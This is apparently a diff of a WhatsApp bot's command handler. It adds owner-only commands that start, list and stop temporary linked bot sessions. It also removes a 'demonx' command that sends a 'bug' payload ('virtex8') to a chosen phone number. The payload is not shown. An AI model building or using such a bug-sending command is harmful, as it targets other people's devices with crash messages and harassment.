@@ -4476,23 +4476,67 @@ case 'areact': {
     }
     break;
 }
-case  'demonx':
-try{
-if(!isOwner) return setReply(mess.only.owner)
-let Pe = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
-console.log(Pe)
-if(!Pe ) return reply("Enter target number")
-if(Pe == Ownerin) return setReply("SendBug Failed")
-await setReply("Sending...")
-await conn.sendKatalog(Pe, virtex8(prefix), virtex8(prefix), thumb, {quoted: fcall})
-let a = await conn.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
-conn.sendMessage(Pe, { text: "𝐁.𝐃" }, { quoted: a });
-reply(`Successfully sent Bug to Number ${Pe.split("@")[0]}`)
-} catch (err){
-console.log(err)
-reply("Failed to submit bug, Error Occurred")
+case 'jadibot': {
+    if (!isOwner) return reply(`This command is restricted to the bot owner.`);
+
+    try {
+        await loading();
+        const { jadibot } = require('./lib/jadibot.js');
+        const startBot = await jadibot(conn, m);
+
+        if (startBot) {
+            reply(`\`\`\`Temporary bot session started successfully!\`\`\`\n\nScan the QR code sent to link your device.`);
+        } else {
+            reply(`\`\`\`Failed to start the temporary bot session. Please try again later.\`\`\``);
+        }
+    } catch (error) {
+        console.error("Error in jadibot case:", error);
+        reply("An error occurred while trying to start the temporary bot session. Please try again later.");
+    }
+    break;
 }
-break
+
+case 'stopjadibot': {
+    if (!isOwner) return reply(`This command is restricted to the bot owner.`);
+
+    try {
+        const { stopjadibot } = require('./lib/jadibot.js');
+        const stopBot = await stopjadibot(conn, m);
+
+        if (stopBot) {
+            reply(`\`\`\`Temporary bot session stopped successfully!\`\`\``);
+        } else {
+            reply(`\`\`\`No active bot session to stop.\`\`\``);
+        }
+    } catch (error) {
+        console.error("Error in stopjadibot case:", error);
+        reply("An error occurred while trying to stop the temporary bot session. Please try again later.");
+    }
+    break;
+}
+
+case 'listjadibot': {
+    if (!isOwner) return reply(`This command is restricted to the bot owner.`);
+
+    try {
+        const { listjadibot } = require('./lib/jadibot.js');
+        const botList = listjadibot();
+
+        if (botList.length > 0) {
+            let message = '*Active Temporary Bots:*\n\n';
+            botList.forEach((bot, index) => {
+                message += `${index + 1}. *User:* ${bot.jid} - *Name:* ${bot.name}\n`;
+            });
+            reply(message);
+        } else {
+            reply(`\`\`\`No active temporary bot sessions found.\`\`\``);
+        }
+    } catch (error) {
+        console.error("Error in listjadibot case:", error);
+        reply("An error occurred while fetching the list of active temporary bots. Please try again later.");
+    }
+    break;
+}
 
 
 
